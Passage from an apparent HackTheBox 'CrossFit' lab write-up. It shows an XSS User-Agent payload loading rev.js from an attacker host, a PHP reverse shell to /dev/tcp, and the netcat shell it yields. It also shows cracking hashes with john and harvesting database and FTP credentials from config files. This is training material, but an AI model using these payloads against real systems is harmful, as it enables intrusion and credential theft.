<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># lftp                                                                                                      </span></span><br><span class="line">lftp :~&gt; <span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line">lftp :~&gt; connect 10.10.10.208</span><br><span class="line">lftp 10.10.10.208:~&gt; <span class="built_in">set</span> ssl:verify-certificate no</span><br><span class="line">lftp 10.10.10.208:~&gt; login luci</span><br><span class="line">密码: </span><br><span class="line">lftp luci@10.10.10.208:~&gt; <span class="built_in">ls</span></span><br><span class="line">drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test</span><br><span class="line">drwxr-xr-x   13 0        0            4096 May 07  2020 ftp</span><br><span class="line">drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 01  2020 html</span><br><span class="line">lftp luci@10.10.10.208:/&gt; <span class="built_in">cd</span> development-test</span><br><span class="line">lftp luci@10.10.10.208:/development-test&gt; <span class="built_in">ls</span></span><br><span class="line">lftp luci@10.10.10.208:/development-test&gt; put rev.php</span><br><span class="line">69 bytes transferred <span class="keyword">in</span> 12 seconds (6 B/s)       </span><br><span class="line">lftp luci@10.10.10.208:/development-test&gt; <span class="built_in">ls</span></span><br><span class="line">-rw-r--r--    1 1002     1002           69 Nov 28 14:30 rev.php</span><br></pre></td></tr></table></figure>

<h3 id="step-5"><a href="#step-5" class="headerlink" title="step 5"></a>step 5</h3><p>Go to burp repeater tab and edit it to rev.js and send it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /blog-single.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">User-Agent: &lt;script src=<span class="string">&quot;http://10.10.14.8/rev.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">Origin: http://gym-club.crossfit.htb</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://gym-club.crossfit.htb/blog-single.php</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=dcasdc&amp;email=casdcasdcd%40qq.com&amp;phone=17746608760&amp;message=%3Cscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>Now let’s see our netcat listner</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.208 - - [28/Nov/2020 09:29:23] <span class="string">&quot;GET /rev.js HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 9988</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9988</span><br><span class="line">Ncat: Listening on 0.0.0.0:9988</span><br><span class="line">Ncat: Connection from 10.10.10.208.</span><br><span class="line">Ncat: Connection from 10.10.10.208:37118.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (712): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@crossfit:/var/www/development-test$ <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@crossfit:/var/www/development-test$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>Boom we got the shell as www-data.</p>
<p>Now let’s run the linPEAS.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nhcmxvc3BvbG9wL3ByaXZpbGVnZS1lc2NhbGF0aW9uLWF3ZXNvbWUtc2NyaXB0cy1zdWl0ZS90cmVlL21hc3Rlci9saW5QRUFT">LinPEAS - Linux Privilege Escalation Awesome Script<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@crossfit:/var/www/development-test$ ./linpeas.sh &gt; info</span><br><span class="line">./linpeas.sh &gt; info</span><br><span class="line"><span class="built_in">ls</span>: cannot access <span class="string">&#x27;/etc/hosts.denied&#x27;</span>: No such file or directory</span><br><span class="line">grep: write error: Broken pipe</span><br><span class="line">www-data@crossfit:/var/www/development-test$</span><br></pre></td></tr></table></figure>

<p>After analyze the output i found two interesting things.</p>
<p>First is crontabs</p>
<p>They run send_updates.php file that’s look suspicious.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAILTO=<span class="string">&quot;&quot;</span></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line">*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php</span><br></pre></td></tr></table></figure>

<p>Second is 2 hashes in the linPEAS result.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Looking <span class="keyword">for</span> specific hashes inside files - less <span class="literal">false</span> positives (<span class="built_in">limit</span> 70)</span><br><span class="line">/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio<span class="variable">$A777Jj8tk5</span>.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/</span><br><span class="line">/var/www/ftp/database/factories/UserFactory.php:$2y$10<span class="variable">$92IXUNpkjO0rOQ5byMi</span>.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</span><br></pre></td></tr></table></figure>

<p>Let’s try to crack this hashes</p>
<p>I save this hashes in a file called hash</p>
<p>hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$6$e20D6nUeTJOIyRio<span class="variable">$A777Jj8tk5</span>.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/</span><br><span class="line">$2y$10<span class="variable">$92IXUNpkjO0rOQ5byMi</span>.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</span><br></pre></td></tr></table></figure>

<p>Let’s crack it with john.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># john -w=/usr/share/wordlists/rockyou.txt hash</span></span><br><span class="line">Warning: only loading hashes of <span class="built_in">type</span> <span class="string">&quot;sha512crypt&quot;</span>, but also saw <span class="built_in">type</span> <span class="string">&quot;bcrypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=bcrypt&quot;</span> option to force loading hashes of that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">powerpuffgirls   (?)</span><br><span class="line">1g 0:00:00:05 DONE (2020-11-28 09:51) 0.1919g/s 4618p/s 4618c/s 4618C/s tajmahal..hunibuni</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>And we got the password called powerpuffgirls</p>
<p>And this hash is for hank user that we see in linPEAS result.</p>
<p>Let’s try to ssh in and got our user.txt flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># ssh hank@10.10.10.208</span></span><br><span class="line">hank@10.10.10.208<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">No mail.</span></span><br><span class="line"><span class="string">Last login: Mon Sep 21 05:46:24 2020 from 10.10.14.2</span></span><br><span class="line"><span class="string">hank@crossfit:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">hank@crossfit:~$ cat user.txt</span></span><br><span class="line"><span class="string">d6ce5237244a14992edde7f0b62b6076</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb127.jpg"></li>
</ul>
<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>Let’s check crontabs first.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:~$ <span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">MAILTO=<span class="string">&quot;&quot;</span></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)                                                                                                </span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)                                                                                                  </span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)                                                                                          </span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...                                                                          </span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat                                             </span></span><br><span class="line"><span class="comment"># |  |  |  |  |                                                                                                                    </span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed                                                                                   </span></span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly                                                                </span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )                                </span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )                               </span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )                              </span><br><span class="line">*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php</span><br></pre></td></tr></table></figure>

<p>there is a send_updates.php file which we see in the previous linPEAS result.</p>
<p>Let’s check what inside the send_updates.php.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:~$ <span class="built_in">cat</span> /home/isaac/send_updates/send_updates.php</span><br><span class="line">&lt;?php</span><br><span class="line">/***************************************************</span><br><span class="line"> * Send email updates to <span class="built_in">users</span> <span class="keyword">in</span> the mailing list *</span><br><span class="line"> ***************************************************/</span><br><span class="line">require(<span class="string">&quot;vendor/autoload.php&quot;</span>);</span><br><span class="line">require(<span class="string">&quot;includes/functions.php&quot;</span>);</span><br><span class="line">require(<span class="string">&quot;includes/db.php&quot;</span>);</span><br><span class="line">require(<span class="string">&quot;includes/config.php&quot;</span>);</span><br><span class="line">use mikehaertl\shellcommand\Command;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$fs_iterator</span> = new FilesystemIterator(<span class="variable">$msg_dir</span>);</span><br><span class="line"></span><br><span class="line">    foreach (<span class="variable">$fs_iterator</span> as <span class="variable">$file_info</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file_info</span>-&gt;isFile())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$full_path</span> = <span class="variable">$file_info</span>-&gt;getPathname(); </span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;query(<span class="string">&#x27;SELECT email FROM users&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$command</span> = new Command(<span class="string">&#x27;/usr/bin/mail&#x27;</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;addArg(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;CrossFit Club Newsletter&#x27;</span>, <span class="variable">$escape</span>=<span class="literal">true</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;addArg(<span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$escape</span>=<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$msg</span> = file_get_contents(<span class="variable">$full_path</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;setStdIn(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">unlink</span>(<span class="variable">$full_path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cleanup();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>We can check that if the mikehaertl library does not protect what it reads in the database … so we can pass it a command.</p>
<p>Looking in the library repository (you can see the version in the composer.json file) there is a problem in this issue # 44</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pa2VoYWVydGwvcGhwLXNoZWxsY29tbWFuZC9pc3N1ZXMvNDQ=">escapeArgs option is not working properly<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>now we need ftp credentials to be able to inject the commands into the database so that the php script can read them and run them.</p>
<p>Before doing enumeration I saw the credentials in &#x2F;var&#x2F;www&#x2F;gym-club&#x2F;db.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:/home/isaac/send_updates$ <span class="built_in">cat</span> /var/www/gym-club/db.php </span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;crossfit&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;oeLoo~y2baeni&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="string">&quot;crossfit&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = new mysqli(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$db</span>);</span><br><span class="line">hank@crossfit:/home/isaac/send_updates$</span><br></pre></td></tr></table></figure>

<p>Now we only need one thing ftp credentials.</p>
<p>I run linPEAS again and found a interesting file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[+] Readable files belonging to root and readable by me but not world readable</span><br><span class="line">-r--r----- 1 root hank 33 Nov 28 07:54 /home/hank/user.txt                                                                                                                                                                                 </span><br><span class="line">-rw-r----- 1 root admins 384 Sep 27  2017 /etc/pam.d/chfn</span><br><span class="line">-rw-r----- 1 root admins 92 Sep 27  2017 /etc/pam.d/newusers</span><br><span class="line">-rw-r----- 1 root admins 119 Oct  9  2019 /etc/pam.d/vmtoolsd</span><br><span class="line">-rw-r----- 1 root admins 1221 May 11  2020 /etc/pam.d/common-auth</span><br><span class="line">-rw-r----- 1 root admins 4944 May  7  2020 /etc/pam.d/login</span><br><span class="line">-rw-r----- 1 root admins 317 Jan 29  2020 /etc/pam.d/systemd-user</span><br><span class="line">-rw-r----- 1 root admins 138 Jan 10  2019 /etc/pam.d/runuser-l</span><br><span class="line">-rw-r----- 1 root admins 1208 May 11  2020 /etc/pam.d/common-account</span><br><span class="line">-rw-r----- 1 root admins 319 May  1  2020 /etc/pam.d/vsftpd.orig</span><br><span class="line">-rw-r----- 1 root admins 2256 May 11  2020 /etc/pam.d/su</span><br><span class="line">-rw-r----- 1 root admins 647 May 12  2020 /etc/pam.d/vsftpd</span><br><span class="line">-rw-r----- 1 root admins 137 Jan 10  2019 /etc/pam.d/su-l</span><br><span class="line">-rw-r----- 1 root admins 90 May  7  2020 /etc/pam.d/chpasswd</span><br><span class="line">-rw-r----- 1 root admins 1440 May 11  2020 /etc/pam.d/common-password</span><br><span class="line">-rw-r----- 1 root admins 1154 May 11  2020 /etc/pam.d/common-session-noninteractive</span><br><span class="line">-rw-r----- 1 root admins 2133 May  6  2020 /etc/pam.d/sshd</span><br><span class="line">-rw-r----- 1 root admins 1189 May 11  2020 /etc/pam.d/common-session</span><br><span class="line">-rw-r----- 1 root admins 520 Feb 14  2019 /etc/pam.d/other</span><br><span class="line">-rw-r----- 1 root admins 580 May  7  2020 /etc/pam.d/chsh</span><br><span class="line">-rw-r----- 1 root admins 92 Sep 27  2017 /etc/pam.d/passwd</span><br><span class="line">-rw-r----- 1 root admins 606 Oct 11  2019 /etc/pam.d/cron</span><br><span class="line">-rw-r----- 1 root admins 143 Jan 10  2019 /etc/pam.d/runuser</span><br></pre></td></tr></table></figure>

<p>Let’s see the content inside the file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:~$ <span class="built_in">cat</span> /etc/pam.d/vsftpd</span><br><span class="line">auth sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3</span><br><span class="line">account sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard behaviour for ftpd(8).</span></span><br><span class="line">auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard pam includes</span></span><br><span class="line">@include common-account</span><br><span class="line">@include common-session</span><br><span class="line">@include common-auth</span><br><span class="line">auth    required        pam_shells.so</span><br></pre></td></tr></table></figure>

<p>And we find the ftp credentials</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=ftpadm passwd=8W)&#125;gpRJvAmnb</span><br></pre></td></tr></table></figure>

<p>Without wasting time let’s login in ftp with this credentials.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># lftp</span></span><br><span class="line">lftp :~&gt; <span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line">lftp :~&gt; connect 10.10.10.208</span><br><span class="line">lftp 10.10.10.208:~&gt; <span class="built_in">set</span> ssl:verify-certificate no</span><br><span class="line">lftp 10.10.10.208:~&gt; login ftpadm</span><br><span class="line">密码: </span><br><span class="line">lftp ftpadm@10.10.10.208:~&gt; <span class="built_in">ls</span></span><br><span class="line">drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages</span><br><span class="line">lftp ftpadm@10.10.10.208:/&gt; <span class="built_in">cd</span> messages</span><br><span class="line">lftp ftpadm@10.10.10.208:/messages&gt; <span class="built_in">ls</span></span><br><span class="line">lftp ftpadm@10.10.10.208:/messages&gt;</span><br></pre></td></tr></table></figure>

<p>There is a one directory called messsage but nothing inside it let’s put our rev.php inside it which we previously create.</p>
<p>rev.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># cat rev.php </span></span><br><span class="line">&lt;?php system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1&#x27;&quot;</span>) ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lftp ftpadm@10.10.10.208:/messages&gt; <span class="built_in">ls</span></span><br><span class="line">lftp ftpadm@10.10.10.208:/messages&gt; put rev.php</span><br><span class="line">69 bytes transferred <span class="keyword">in</span> 9 seconds (8 B/s)                        </span><br><span class="line">lftp ftpadm@10.10.10.208:/messages&gt; <span class="built_in">ls</span></span><br><span class="line">-rw-r--r--    1 1003     1004           69 Nov 28 15:35 rev.php</span><br></pre></td></tr></table></figure>

<p>Let’s login in mysql database.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:~$ mysql -h localhost -ucrossfit -poeLoo~y2baeni</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 2613</span><br><span class="line">Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| crossfit           |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>There is one database inside let go inside this and we see users table but nothing inside let’s put our rev shell inside.</p>
<p>Before insert inside users table start your netcat listner on 9001.</p>
